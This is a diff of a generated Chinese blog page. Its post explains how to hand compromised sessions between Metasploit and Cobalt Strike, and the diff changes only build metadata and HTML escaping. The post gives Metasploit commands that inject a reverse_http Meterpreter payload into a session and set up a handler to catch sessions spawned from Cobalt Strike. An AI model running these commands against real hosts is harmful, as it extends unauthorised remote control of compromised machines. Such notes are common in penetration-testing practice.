@@ -32,7 +32,7 @@
     KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
     KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
   </script>
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 5.4.2"></head>
 
 
 <body>
@@ -247,7 +247,7 @@
         
         
             <span class="meta-info-item post-wordcount">
-                <i class="icon fas fa-file-word"></i>&nbsp;<span>170 字</span>
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>161 字</span>
             </span>
         
         
@@ -274,12 +274,12 @@
                     
 
                     <h2 id="MSF下的会话传给CS"><a href="#MSF下的会话传给CS" class="headerlink" title="MSF下的会话传给CS"></a>MSF下的会话传给CS</h2><p>msf使用注入模块 + cs创建Listener监听 （相同payload）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">set DisablePayloadHandler true</span><br><span class="line">set lhost (cs listener ip)</span><br><span class="line">set lport (cs listener port)</span><br><span class="line">set session (id)</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set DisablePayloadHandler true</span><br><span class="line">set lhost (cs listener ip)</span><br><span class="line">set lport (cs listener port)</span><br><span class="line">set session (id)</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
 
 <h2 id="CS下的会话传给MSF"><a href="#CS下的会话传给MSF" class="headerlink" title="CS下的会话传给MSF"></a>CS下的会话传给MSF</h2><p>使用msf监听模块，ip就是kali的ip，端口就是监听的端口，payload要和cs需要派生的会话相同，然后运行，开始监听</p>
 <p>cs创建一个listener，payload为Foreign HTTP，ip也是kali的ip端口和kali监听端口一样<br>右击要传的会话，点击Spawn，选择foregin http那个listense<br>等它执行完命令，msf就会出现一个meterpreter</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http  </span><br><span class="line">set lhost (cs listener ip)</span><br><span class="line">   set lport (cs listener port)</span><br><span class="line">   </span><br><span class="line">   run</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http  </span><br><span class="line">set lhost (cs listener ip)</span><br><span class="line">   set lport (cs listener port)</span><br><span class="line">   </span><br><span class="line">   run</span><br></pre></td></tr></table></figure>
                 </div>
                 
 
